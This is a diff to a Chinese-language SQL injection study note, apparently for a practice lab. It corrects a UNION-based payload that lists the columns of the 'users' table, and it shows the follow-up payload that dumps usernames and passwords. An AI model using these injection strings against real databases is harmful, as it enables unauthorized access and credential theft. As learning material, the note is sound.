@@ -39,7 +39,7 @@
         	使用where条件限定只查询'security'库的信息
         ```
 
-    *   `union select 1,group_concat(column_name),3 from information_schema.columns where column_name = 'users'` 根据列名查找当前字段名
+    *   `union select 1,group_concat(column_name),3 from information_schema.columns where table_name= 'users'` 根据列名查找当前字段名
     
     *   ` union select 1,(select group_concat(username,0x3a,password)from users),3` 根据查找到的列名直接进行数据读取.  Tips:`0x3a`转换后的字符为冒号`:` 
     
